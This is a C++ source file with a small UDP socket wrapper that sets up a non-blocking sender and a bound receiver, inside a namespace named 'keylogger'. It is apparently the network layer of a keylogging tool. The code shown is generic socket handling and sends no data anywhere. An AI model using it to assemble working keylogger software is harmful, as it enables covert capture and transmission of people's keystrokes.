#include "io/udp/udp_socket.h"

#include <fcntl.h>
#include <unistd.h>

#include <string>

namespace keylogger {

UdpSocket::UdpSocket() : is_open_(false) {}

UdpSocket::~UdpSocket() {
  if (sock_info_.fd) close(sock_info_.fd);
}

int UdpSocket::SetupSender(const std::string& addr, int port, int flags) {
  /* File descriptor initalization. */
  sock_info_.port = port;
  sock_info_.fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock_info_.fd < 0) return -1;

  /* Initialize the remote target's sockaddr_in info. */
  sock_info_.remote.sin_family = AF_INET;
  sock_info_.remote.sin_port = htons(static_cast<uint16_t>(port));
  int status = inet_aton(addr.c_str(), &sock_info_.remote.sin_addr);
  if (!status) return -1;

  /* Set the socket to be non blocking. */
  int sock_flags = fcntl(sock_info_.fd, F_GETFL);
  status = fcntl(sock_info_.fd, F_SETFL, sock_flags | flags);
  if (status < 0) return -1;

  /* Initialize the local machine's sockaddr_in info. */
  sock_info_.local.sin_family = AF_INET;
  sock_info_.local.sin_port = htons(0);
  sock_info_.local.sin_addr.s_addr = htonl(INADDR_ANY);

  return 0;
}

int UdpSocket::SetupReceiver(int port, int flags) {
  /* File descriptor initalization. */
  sock_info_.port = port;
  sock_info_.fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock_info_.fd < 0) return -1;

  /* See https://lwn.net/Articles/542629/ for reasoning behind use of
   * SO_REUSEPORT. */
  int on = 1;
  int status =
      setsockopt(sock_info_.fd, SOL_SOCKET, SO_REUSEPORT, &on, sizeof(on));
  if (status < 0) return -1;

  /* Set the socket to be non blocking. */
  int sock_flags = fcntl(sock_info_.fd, F_GETFL);
  status = fcntl(sock_info_.fd, F_SETFL, sock_flags | flags);
  if (status < 0) return -1;

  /* Initialize the local machine's sockaddr_in info. */
  sock_info_.local.sin_family = AF_INET;
  sock_info_.local.sin_port = htons(static_cast<uint16_t>(port));
  sock_info_.local.sin_addr.s_addr = htonl(INADDR_ANY);

  /* Bind us to listen for incoming datagrams. */
  status = bind(sock_info_.fd, (struct sockaddr*)&sock_info_.local,
                sizeof(sock_info_.local));
  if (status < 0) return -1;

  return 0;
}

}  // namespace keylogger
